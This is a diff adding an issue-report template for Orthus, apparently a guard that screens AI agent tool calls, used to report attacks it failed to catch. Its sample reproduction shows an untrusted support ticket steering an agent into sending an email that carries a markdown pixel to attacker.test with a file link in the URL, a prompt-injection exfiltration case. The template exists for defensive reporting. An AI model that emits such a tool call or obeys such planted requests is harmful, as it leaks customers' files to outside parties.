@@ -1,0 +1,128 @@
+name: Missed detection
+about: Orthus allowed something that should probably be blocked or require approval
+labels: ["missed-detection", "triage"]
+body:
+  - type: markdown
+    attributes:
+      value: |
+        Thanks for reporting a missed detection.
+
+        Please keep reports defensive and sanitized.
+        Do **not** include working malware, real secrets, real payment data, private customer data, or production credentials.
+        Use placeholders like `attacker.test`, `FAKE_TOKEN`, `FAKE_CARD`, and `CUSTOMER_ID`.
+
+  - type: textarea
+    id: summary
+    attributes:
+      label: Summary
+      description: What risky action did Orthus miss?
+      placeholder: "Example: Orthus allowed an outbound email containing a pre-authenticated file link to an external pixel URL."
+    validations:
+      required: true
+
+  - type: dropdown
+    id: expected_decision
+    attributes:
+      label: Expected decision
+      description: What should Orthus have returned?
+      options:
+        - log_only
+        - require_approval
+        - block
+        - not sure
+    validations:
+      required: true
+
+  - type: dropdown
+    id: attack_family
+    attributes:
+      label: Attack / risk family
+      options:
+        - Prompt / instruction injection
+        - Data exfiltration
+        - Sensitive path / secret access
+        - Tool or plugin abuse
+        - MCP lifecycle / protocol abuse
+        - Database / SQL confused deputy
+        - Payment / card verification abuse
+        - Network auth / redirect risk
+        - Session / sequence risk
+        - Other
+    validations:
+      required: true
+
+  - type: textarea
+    id: request
+    attributes:
+      label: Sanitized request / tool call
+      description: Paste a minimal reproduction. Replace sensitive values with placeholders.
+      render: json
+      placeholder: |
+        {
+          "text": "Untrusted ticket asks the agent to export data externally",
+          "tool_call": {
+            "name": "send_email",
+            "args": {
+              "to": "user@example.com",
+              "body": "![](https://attacker.test/pixel?file_link=FAKE_LINK)"
+            }
+          },
+          "actor": {"role": "support_agent"},
+          "session_context": {}
+        }
+    validations:
+      required: true
+
+  - type: textarea
+    id: actual_result
+    attributes:
+      label: Actual Orthus result
+      description: Paste the sanitized Orthus response if available.
+      render: json
+      placeholder: |
+        {
+          "decision": "allow",
+          "risk": 0.01,
+          "reason_codes": []
+        }
+    validations:
+      required: false
+
+  - type: textarea
+    id: why_risky
+    attributes:
+      label: Why is this risky?
+      description: Explain the action-level risk. Focus on what would execute, not only on suspicious text.
+      placeholder: "Example: The proposed action sends a customer-visible message that embeds an external tracking pixel with a file link."
+    validations:
+      required: true
+
+  - type: dropdown
+    id: structured_action
+    attributes:
+      label: Is there an explicit structured action?
+      description: Orthus V1 prioritizes explicit tool calls, arguments, destinations, paths, and session state.
+      options:
+        - Yes, the risky action is explicit in tool name / args
+        - Partly, it depends on session sequence
+        - No, it is mostly semantic / long-horizon
+        - Not sure
+    validations:
+      required: true
+
+  - type: textarea
+    id: safe_negative
+    attributes:
+      label: Safe negative / false-positive concern
+      description: Is there a similar safe case Orthus should avoid blocking?
+      placeholder: "Example: Documentation explaining markdown tracking pixels should not be blocked when using search_kb."
+    validations:
+      required: false
+
+  - type: input
+    id: version
+    attributes:
+      label: Orthus version / commit
+      placeholder: "v0.1.4 or commit SHA"
+    validations:
+      required: false
